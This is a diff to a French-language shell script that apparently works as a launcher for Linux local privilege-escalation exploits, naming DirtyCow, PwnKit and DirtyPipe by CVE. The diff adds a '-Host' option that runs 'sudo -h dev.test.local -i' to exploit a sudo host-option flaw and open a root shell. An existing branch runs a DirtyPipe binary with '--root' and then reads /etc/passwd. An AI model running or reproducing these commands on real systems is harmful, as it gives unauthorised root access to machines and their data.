@@ -28,6 +28,7 @@ if [[ "$*" == "-help" ]]; then
     echo "   -DirtyCow      Compilation + execution binaire - CVE-2016-5195"
     echo "   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034"
     echo "   -DirtyPipe     DirtyPipe - CVE-2022-0847"
+    echo "   -Host          Sudo Host - CVE-2025-32462"
     echo "   -check         Verifie si gcc est installer"
     echo "   -perm          Applique les droit d'execution sur '/fullEx'"
     echo " "
@@ -89,4 +90,9 @@ fi
 if [[ "$*" == "-DirtyPipe" ]]; then
      ${PWD}/exploit/DirtyPipe/dpipe --root
      cat /etc/passwd | grep root
+fi
+
+# Sudo-Host
+if [[ "$*" == "-Host" ]]; then
+     sudo -h dev.test.local -i
 fi
